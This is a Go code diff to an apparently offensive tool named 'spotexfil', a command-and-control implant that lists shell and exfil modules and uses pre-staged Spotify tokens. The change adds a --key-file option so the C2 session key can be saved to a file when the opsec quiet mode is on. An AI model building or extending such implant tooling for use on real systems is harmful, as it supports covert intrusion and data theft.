@@ -5,6 +5,7 @@ import (
 	"context"
 	crand "crypto/rand"
 	"fmt"
+	"io"
 	"math/big"
 	"os"
 	"strings"
@@ -36,6 +37,30 @@ func generatePassphrase() (string, error) {
 		words[i] = keyWords[idx.Int64()]
 	}
 	return strings.Join(words, "-"), nil
+}
+
+// deliverSessionKey delivers the generated C2 session key: printed to
+// w (os.Stdout in production) unless quiet, and/or written to keyFile
+// with 0600 permissions. In quiet mode the key must never hit stdout
+// (scrollback/logs), so --key-file is required.
+func deliverSessionKey(key, keyFile string, quiet bool, w io.Writer) error {
+	if quiet && keyFile == "" {
+		return fmt.Errorf("--quiet requires --key-file so the session key is not printed to stdout")
+	}
+	if keyFile != "" {
+		if err := os.WriteFile(keyFile, []byte(key+"\n"), 0600); err != nil {
+			return fmt.Errorf("write key file: %w", err)
+		}
+	}
+	if quiet {
+		return nil
+	}
+	fmt.Fprintf(w, "[*] Session key: %s\n", key)
+	fmt.Fprintf(w, "[*] Use this key to start the operator: ./spotexfil c2-operator -k \"%s\"\n", key)
+	if keyFile != "" {
+		fmt.Fprintf(w, "[*] Session key written to %s (0600)\n", keyFile)
+	}
+	return nil
 }
 
 var version = "1.0.0"
@@ -178,7 +203,7 @@ func cleanCmd() *cobra.Command {
 
 func c2ImplantCmd() *cobra.Command {
 	var interval, jitter int
-	var pluginDir, tokenFile, modules string
+	var pluginDir, tokenFile, modules, keyFile string
 	var quiet bool
 
 	cmd := &cobra.Command{
@@ -190,8 +215,9 @@ func c2ImplantCmd() *cobra.Command {
 			if err != nil {
 				return fmt.Errorf("failed to generate key: %w", err)
 			}
-			fmt.Printf("[*] Session key: %s\n", key)
-			fmt.Printf("[*] Use this key to start the operator: ./spotexfil c2-operator -k \"%s\"\n", key)
+			if err := deliverSessionKey(key, keyFile, quiet, os.Stdout); err != nil {
+				return err
+			}
 
 			// Load plugins if directory specified
 			if pluginDir != "" {
@@ -243,6 +269,7 @@ func c2ImplantCmd() *cobra.Command {
 	cmd.Flags().StringVar(&pluginDir, "plugin-dir", "", "Directory containing .so plugin modules")
 	cmd.Flags().StringVar(&tokenFile, "token-file", "", "Path to pre-staged Spotify token JSON (or use SPOTIFY_TOKEN_JSON)")
 	cmd.Flags().BoolVarP(&quiet, "quiet", "q", false, "Suppress non-error output (opsec)")
+	cmd.Flags().StringVar(&keyFile, "key-file", "", "Write the generated session key to this path (0600) instead of stdout — required with --quiet")
 	cmd.Flags().StringVar(&modules, "modules", "", "Comma-separated module allowlist (e.g. shell,exfil,sysinfo,push) — empty = all")
 
 	return cmd
